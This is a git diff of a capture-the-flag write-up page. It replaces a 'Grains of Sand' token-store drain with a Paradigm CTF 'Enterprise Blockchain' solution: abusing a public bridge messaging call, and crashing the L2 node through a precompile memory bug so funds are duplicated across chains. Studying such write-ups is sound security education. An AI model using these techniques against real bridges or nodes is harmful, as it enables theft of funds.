@@ -12,14 +12,14 @@
         <meta name="author" content="YanhuiJessica">
       
       
-        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/paradigm/grains_of_sand/">
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/paradigm/enterprise_blockchain/">
       
       <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-8.3.3">
     
     
       
-        <title>Blockchain - Grains of Sand - Chictf-Writeups</title>
+        <title>Blockchain - Enterprise Blockchain - Chictf-Writeups</title>
       
     
     
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Blockchain - Grains of Sand
+              Blockchain - Enterprise Blockchain
             
           </span>
         </div>
@@ -2662,6 +2662,20 @@
               
   
   
+  
+    <li class="md-nav__item">
+      <a href="../grains_of_sand/" class="md-nav__link">
+        Grains of Sand
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
     
   
   
@@ -2672,12 +2686,12 @@
       
       
         <label class="md-nav__link md-nav__link--active" for="__toc">
-          Grains of Sand
+          Enterprise Blockchain
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        Grains of Sand
+        Enterprise Blockchain
       </a>
       
         
@@ -2709,8 +2723,8 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
+  <a href="#solution_1" class="md-nav__link">
+    Solution
   </a>
   
 </li>
@@ -2727,24 +2741,17 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
       
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../enterprise_blockchain/" class="md-nav__link">
-        Enterprise Blockchain
-      </a>
     </li>
   
 
@@ -3400,8 +3407,8 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
+  <a href="#solution_1" class="md-nav__link">
+    Solution
   </a>
   
 </li>
@@ -3415,6 +3422,13 @@
         
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
   
 </li>
       
@@ -3439,24 +3453,28 @@
 
   
                 
-  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/paradigm/grains_of_sand.md" title="编辑此页" class="md-content__button md-icon">
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/paradigm/enterprise_blockchain.md" title="编辑此页" class="md-content__button md-icon">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
   </a>
 
 
 
-  <h1>Grains of Sand</h1>
+  <h1>Enterprise Blockchain</h1>
 
 <div class="md-typeset">
     <div class="blogging-tags-grid">
 
         <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>
 
-        <a href="#fee on transfer" class="blogging-tag"><code>#fee on transfer</code></a>
+        <a href="#cross chain" class="blogging-tag"><code>#cross chain</code></a>
 
-        <a href="#signature replay" class="blogging-tag"><code>#signature replay</code></a>
+        <a href="#revm" class="blogging-tag"><code>#revm</code></a>
 
-        <a href="#dune" class="blogging-tag"><code>#dune</code></a>
+        <a href="#precompiled contract" class="blogging-tag"><code>#precompiled contract</code></a>
+
+        <a href="#state override set" class="blogging-tag"><code>#state override set</code></a>
+
+        <a href="#infrastructure" class="blogging-tag"><code>#infrastructure</code></a>
 
     </div>
 
@@ -3484,236 +3502,310 @@
     }
 </style>
 <h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h2>
-<p>At what point does it stop being a heap?</p>
-<details class="note">
-<summary>Deploy.s.sol</summary>
-<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
-<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
-
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;forge-ctf/CTFDeployment.sol&quot;</span><span class="p">;</span>
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../src/Challenge.sol&quot;</span><span class="p">;</span>
-
-<span class="nx">contract</span><span class="w"> </span><span class="nx">Deploy</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">CTFDeployment</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deploy</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">system</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">challenge</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startBroadcast</span><span class="p">(</span><span class="nx">system</span><span class="p">);</span>
-
-<span class="w">        </span><span class="nx">challenge</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">Challenge</span><span class="p">());</span>
-
-<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopBroadcast</span><span class="p">();</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-</details>
-<details class="note">
-<summary>src/Challenge.sol</summary>
-<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
-<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
-
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
-
-<span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">IERC20</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">TOKEN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="mh">0xC937f5027D47250Fa2Df8CbF21F6F88E98817845</span><span class="p">);</span>
-
-<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">TOKENSTORE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8</span><span class="p">;</span>
-
-<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">INITIAL_BALANCE</span><span class="p">;</span>
-
-<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">INITIAL_BALANCE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">TOKEN</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">TOKENSTORE</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">isSolved</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">INITIAL_BALANCE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">TOKEN</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">TOKENSTORE</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">11111e8</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-</details>
+<p>Smart Contract Solutions is proud to introduce the only Enterprise Blockchain that you'll ever need.</p>
+<blockquote>
+<p><a href="https://github.com/paradigmxyz/paradigm-ctf-2023/blob/2dab351eb27b57f32bab5aaaf3338638aaf9e4f8/enterprise-blockchain/challenge.yaml">Challenge Files</a></p>
+</blockquote>
 <h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
 <ul>
 <li>
-<p>The private chain is forked from the Ethereum mainnet block with block number <span class="arithmatex">\(18437825\)</span>. And to solve the challenge, the token balance of the token store needs to be decreased by at least <span class="arithmatex">\(11111 \times 10^8\)</span> </p>
-<div class="highlight"><pre><span></span><code><span class="c1">// challenge.py</span>
-<span class="nx">def</span><span class="w"> </span><span class="nx">get_anvil_instances</span><span class="p">(</span><span class="nx">self</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">Dict</span><span class="p">[</span><span class="nx">str</span><span class="p">,</span><span class="w"> </span><span class="nx">LaunchAnvilInstanceArgs</span><span class="p">]</span><span class="o">:</span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="s2">&quot;main&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">self</span><span class="p">.</span><span class="nx">get_anvil_instance</span><span class="p">(</span><span class="nx">fork_block_num</span><span class="o">=</span><span class="mf">18</span><span class="nx">_437_825</span><span class="p">),</span>
-<span class="w">    </span><span class="p">}</span>
+<p>There are two chains and the challenge is deployed on the layer 1 chain. Initially, there are 100 FlagTokens (18 decimals) in the l1Bridge. The objective of this challenge is to pull at least 10 FlagTokens from the l1Bridge</p>
+<div class="highlight"><pre><span></span><code><span class="nx">vm</span><span class="p">.</span><span class="nx">createSelectFork</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">envString</span><span class="p">(</span><span class="s2">&quot;L1_RPC&quot;</span><span class="p">));</span>
+<span class="nx">vm</span><span class="p">.</span><span class="nx">startBroadcast</span><span class="p">(</span><span class="nx">system</span><span class="p">);</span>
+<span class="nx">Bridge</span><span class="w"> </span><span class="nx">l1Bridge</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Bridge</span><span class="p">(</span><span class="nx">relayer</span><span class="p">);</span>
+<span class="nx">FlagToken</span><span class="w"> </span><span class="nx">flagToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">FlagToken</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">l1Bridge</span><span class="p">),</span><span class="w"> </span><span class="nx">player</span><span class="p">);</span>
+
+<span class="nx">challenge</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">Challenge</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">l1Bridge</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">flagToken</span><span class="p">)));</span>
+<span class="nx">vm</span><span class="p">.</span><span class="nx">stopBroadcast</span><span class="p">();</span>
 </code></pre></div>
 </li>
 <li>
-<p>The token GoldReserve (XGR) charges a fee when transferring, but the token store does not support fee-on-transfer tokens. So we can repeatedly deposit and withdraw to drain tokens from the store</p>
-<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">depositToken</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_token</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="nx">deprecable</span><span class="w"> </span><span class="p">{</span>
+<p>Users can transfer funds between chains via the bridge. The relayer will listen to the <code>SendRemoteMessage</code> event in both chains and relay messages to the target chain</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="n">log</span><span class="o">.</span><span class="n">event</span> <span class="o">==</span> <span class="s2">&quot;SendRemoteMessage&quot;</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">_dst_chain_id</span> <span class="o">==</span> <span class="n">log</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&quot;targetChainId&quot;</span><span class="p">]:</span>
+            <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">dst_bridge</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">relayMessage</span><span class="p">(</span>
+                <span class="n">log</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&quot;targetAddress&quot;</span><span class="p">],</span>
+                <span class="n">_src_chain_id</span><span class="p">,</span>
+                <span class="n">log</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&quot;sourceAddress&quot;</span><span class="p">],</span>
+                <span class="n">log</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&quot;msgValue&quot;</span><span class="p">],</span>
+                <span class="n">log</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&quot;msgNonce&quot;</span><span class="p">],</span>
+                <span class="n">log</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&quot;msgData&quot;</span><span class="p">],</span>
+            <span class="p">)</span><span class="o">.</span><span class="n">transact</span><span class="p">()</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">relayMessage</span><span class="p">(</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">_targetAddress</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_sourceChainId</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">_sourceAddress</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_value</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_nonce</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">_message</span>
+<span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyRelayer</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="p">...</span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">Token</span><span class="p">(</span><span class="nx">_token</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">_amount</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">revert</span><span class="p">();</span>
+<span class="w">    </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">result</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_targetAddress</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">_value</span><span class="p">}(</span><span class="nx">_message</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="p">(</span><span class="nx">result</span><span class="p">));</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>To emit a SendRemoteMessage event, we can call <code>sendRemoteMessage()</code> function and the transaction to be executed on the other chain can be customized</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">sendRemoteMessage</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_targetChainId</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_targetAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">_message</span><span class="p">)</span>
+<span class="w">    </span><span class="kr">public</span>
+<span class="w">    </span><span class="nx">payable</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">_targetChainId</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">chainid</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;C&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">_targetAddress</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">SendRemoteMessage</span><span class="p">(</span><span class="nx">_targetChainId</span><span class="p">,</span><span class="w"> </span><span class="nx">_targetAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">msgNonce</span><span class="p">,</span><span class="w"> </span><span class="nx">_message</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">unchecked</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">++</span><span class="nx">msgNonce</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
-<span class="w">    </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_token</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">safeAdd</span><span class="p">(</span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_token</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">],</span><span class="w"> </span><span class="nx">_amount</span><span class="p">);</span><span class="w">  </span><span class="c1">// @note The amount received could be less than _amount</span>
-<span class="w">    </span><span class="nx">Deposit</span><span class="p">(</span><span class="nx">_token</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">_amount</span><span class="p">,</span><span class="w"> </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_token</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>Since L2 RPC is also provided and the player has some ethers, we can send a remote message from L2 to L1 and transfer tokens from l1Bridge to users</p>
+<div class="highlight"><pre><span></span><code><span class="nx">l2Bridge</span><span class="p">.</span><span class="nx">sendRemoteMessage</span><span class="p">(</span>
+<span class="w">    </span><span class="mf">78704</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">address</span><span class="p">(</span><span class="nx">flagToken</span><span class="p">),</span>
+<span class="w">    </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span>
+<span class="w">        </span><span class="s2">&quot;transfer(address,uint256)&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">player</span><span class="p">,</span>
+<span class="w">        </span><span class="mf">50</span><span class="w"> </span><span class="nx">ether</span>
+<span class="w">    </span><span class="p">)</span>
+<span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>However, <a href="https://twitter.com/junorouse/status/1719024561885499840">the <code>sendRemoteMessage()</code> function is not intended to be public</a> and it is expected to only use <code>ethOut()</code> / <code>ERC20Out()</code> to transfer funds between chains :&lt; The above is an unintended solution lol</p>
+</li>
+<li>
+<p>A <code>SimpleMultiSigGov</code> is deployed at 0x31337 on the L2 chain. It can be used to interact with the precompiled contract <code>ADMIN</code> at 1337</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># deploy multisig</span>
+<span class="n">anvil_setCodeFromFile</span><span class="p">(</span>
+    <span class="n">l2_web3</span><span class="p">,</span>
+    <span class="s2">&quot;0x0000000000000000000000000000000000031337&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;MultiSig.sol:SimpleMultiSigGov&quot;</span><span class="p">,</span>
+<span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>The precompiled contract <code>ADMIN</code> has a function <code>fn_dump_state()</code>, operations in which may cause undefined behavior. First, <code>x.len()</code> should be greater than <code>0x10</code>, otherwise the program will panic with <code>index out of bounds</code> when <code>i == x.len()</code>. <code>states</code> is a raw pointer to slices <code>&amp;[u8]</code> and a slice is 16 bytes on an x86-64. The count of <code>states.offset</code> is in units of a slice. Since the maximum of <code>i</code> is <code>0x10</code>, the minimum memory that should be allocated is 0x110 (16 * (0x10 + 1)) instead of <code>0x100</code>. Thus, if <code>x.len()</code> is greater than <code>0x10</code>, the program will write to unallocated memory <code>states.offset(0x10)</code></p>
+<div class="highlight"><pre><span></span><code><span class="k">fn</span> <span class="nf">fn_dump_state</span><span class="p">(</span><span class="n">x</span>: <span class="kp">&amp;</span><span class="p">[</span><span class="kt">u8</span><span class="p">])</span><span class="w"> </span>-&gt; <span class="kt">u64</span> <span class="p">{</span>
+<span class="w">    </span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">states</span>: <span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="o">&amp;</span><span class="p">[</span><span class="kt">u8</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">libc</span>::<span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="o">&amp;</span><span class="p">[</span><span class="kt">u8</span><span class="p">];</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">x</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x10</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">states</span><span class="p">.</span><span class="n">offset</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">isize</span><span class="p">).</span><span class="n">write_bytes</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">usize</span><span class="p">);</span>
+<span class="w">            </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fs</span>::<span class="n">OpenOptions</span>::<span class="n">new</span><span class="p">()</span>
+<span class="w">        </span><span class="p">.</span><span class="n">create</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/tmp/dump-state&quot;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file</span><span class="p">.</span><span class="n">write_all</span><span class="p">(</span><span class="o">&amp;*</span><span class="n">states</span><span class="p">);</span>
+<span class="w">        </span><span class="n">libc</span>::<span class="n">free</span><span class="p">(</span><span class="n">states</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="n">libc</span>::<span class="n">c_void</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="k">u64</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>Calling <code>fn_dump_state()</code> when <code>x.len() &gt; 0x10</code> will kill the L2 node. The <code>anvil</code> service will soon <a href="https://github.com/paradigmxyz/paradigm-ctf-infrastructure/blob/6c39333a674f18458bc27256091ab0306b9d432e/paradigmctf.py/ctf_server/backends/docker_backend.py#L54">restart</a> and <a href="https://github.com/paradigmxyz/paradigm-ctf-infrastructure/blob/6c39333a674f18458bc27256091ab0306b9d432e/paradigmctf.py/ctf_server/types/__init__.py#L41-L42">load the state</a> from the previously dumped state</p>
+</li>
+<li>
+<p>The state dump interval is 5 seconds, but the relayer will relay the message as long as it catches the <code>SendRemoteMessage</code> event. If the L2 node goes down when new cross-chain transfer transactions have been included in a block but the latest state has not yet been dumped, the message will be relayed to L1 while the state of L2 can only be restored to the state before the transfer occurred. In this case, users can transfer funds to L1 without spending any in L2 :O</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">format_anvil_args</span><span class="p">(</span><span class="n">args</span><span class="p">:</span> <span class="n">LaunchAnvilInstanceArgs</span><span class="p">,</span> <span class="n">anvil_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">8545</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
+    <span class="o">...</span>
+    <span class="n">cmd_args</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&quot;--state&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;/data/</span><span class="si">{</span><span class="n">anvil_id</span><span class="si">}</span><span class="s2">-state.json&quot;</span><span class="p">]</span>
+    <span class="n">cmd_args</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&quot;--state-interval&quot;</span><span class="p">,</span> <span class="s2">&quot;5&quot;</span><span class="p">]</span>
+</code></pre></div>
+</li>
+<li>
+<p>Only the <code>SimpleMultiSigGov</code> at 0x31337 can interact with the <code>ADMIN</code>, but we can't obtain any valid signatures to let it execute transactions. Alternatively, we can leverage the state override set to ephemerally override the code at 0x31337 and simulate the call</p>
+</li>
+<li>
+<p>The <code>admin_func_run()</code> function is the entry point of <code>ADMIN</code>. To invoke the <code>fn_dump_state()</code> function, the first two bytes should be <code>0x0204</code></p>
+<div class="highlight"><pre><span></span><code><span class="k">pub</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">ADMIN</span>: <span class="nc">PrecompileAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PrecompileAddress</span><span class="p">(</span>
+<span class="w">    </span><span class="k">crate</span>::<span class="n">u64_to_address</span><span class="p">(</span><span class="mi">1337</span><span class="p">),</span>
+<span class="w">    </span><span class="n">Precompile</span>::<span class="n">Context</span><span class="p">(</span><span class="n">admin_func_run</span><span class="p">),</span>
+<span class="p">);</span>
+
+<span class="k">fn</span> <span class="nf">fn_reload_runtime_config</span><span class="p">(</span><span class="n">rest</span>: <span class="kp">&amp;</span><span class="p">[</span><span class="kt">u8</span><span class="p">],</span><span class="w"> </span><span class="n">_context</span>: <span class="kp">&amp;</span><span class="nc">CallContext</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">u64</span> <span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">rest</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="k">u64</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">match</span><span class="w"> </span><span class="n">ConfigKind</span>::<span class="n">from_u8</span><span class="p">(</span><span class="n">rest</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">..</span><span class="p">.</span>
